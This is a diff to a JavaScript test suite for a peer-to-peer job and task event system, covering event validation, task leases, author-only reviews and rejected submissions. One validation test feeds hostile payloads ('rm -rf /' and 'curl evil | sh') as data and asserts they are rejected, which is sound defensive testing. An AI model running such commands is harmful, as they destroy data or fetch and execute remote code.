@@ -51,7 +51,7 @@ function checkEventOrThrow (e) {
 test('unknown event types and unknown fields cannot be created or accepted', () => {
   assert.throws(() => ev(alice, 'shell.exec', { cmd: 'rm -rf /' }), /unknown event type/)
   assert.throws(() => ev(alice, 'msg', { text: 'hi', run: 'curl evil | sh' }), /invalid body/)
-  assert.throws(() => ev(alice, 'task.submit', { task: 'nope', summary: 's', content: '' }), /invalid body/)
+  assert.throws(() => ev(alice, 'task.submit', { task: 'nope', summary: 's', content: 'x' }), /invalid body/)
   const e = ev(alice, 'msg', { text: 'hi' })
   assert.match(checkEvent({ ...e, extra: 1 }, { now: 2e6 }), /unexpected fields/)
 })
@@ -104,7 +104,7 @@ test('a second claim loses while the lease is live and wins after it expires', (
 test('only the job author can review, add tasks or close', () => {
   const job = ev(alice, 'job.post', { title: 'j', description: '', tasks: [{ title: 't' }] })
   const t0 = `${job.id}:0`
-  const sub = ev(mallory, 'task.submit', { task: t0, summary: 'trust me', content: '' })
+  const sub = ev(mallory, 'task.submit', { task: t0, summary: 'trust me', content: 'x' })
   const selfAccept = ev(mallory, 'task.review', { task: t0, submission: sub.id, verdict: 'accept' })
   const sneakTask = ev(mallory, 'task.add', { job: job.id, title: 'extra' })
   const sneakClose = ev(mallory, 'job.close', { job: job.id })
@@ -117,13 +117,19 @@ test('only the job author can review, add tasks or close', () => {
 test('a rejected result returns the task to the pool; a closed job takes no more work', () => {
   const job = ev(alice, 'job.post', { title: 'j', description: '', tasks: [{ title: 't' }] })
   const t0 = `${job.id}:0`
-  const sub = ev(bob, 'task.submit', { task: t0, summary: 's', content: '' })
+  const sub = ev(bob, 'task.submit', { task: t0, summary: 's', content: 'x' })
   const no = ev(alice, 'task.review', { task: t0, submission: sub.id, verdict: 'reject', note: 'incomplete' })
   let v = reduce([job, sub, no], { now: 9e9 })
   assert.equal(v.tasks.get(t0).status, 'open')
   assert.equal(v.tasks.get(t0).submissions[0].note, 'incomplete')
+
+  // Even if the rejected worker still had a live lease, someone else can take it.
+  const held = ev(bob, 'task.claim', { task: t0, leaseMs: 3600000 }, { lamport: job.lamport + 1, ts: job.ts + 1 })
+  const other = ev(mallory, 'task.claim', { task: t0, leaseMs: 60000 })
+  v = reduce([job, held, sub, no, other], { now: other.ts + 1 })
+  assert.equal(v.tasks.get(t0).holder.peer, mallory.id)
   const close = ev(alice, 'job.close', { job: job.id })
-  const after = ev(bob, 'task.submit', { task: t0, summary: 'late', content: '' })
+  const after = ev(bob, 'task.submit', { task: t0, summary: 'late', content: 'x' })
   v = reduce([job, sub, no, close, after], { now: 9e9 })
   assert.equal(v.jobs.get(job.id).status, 'closed')
   assert.equal(v.tasks.get(t0).submissions.length, 1)
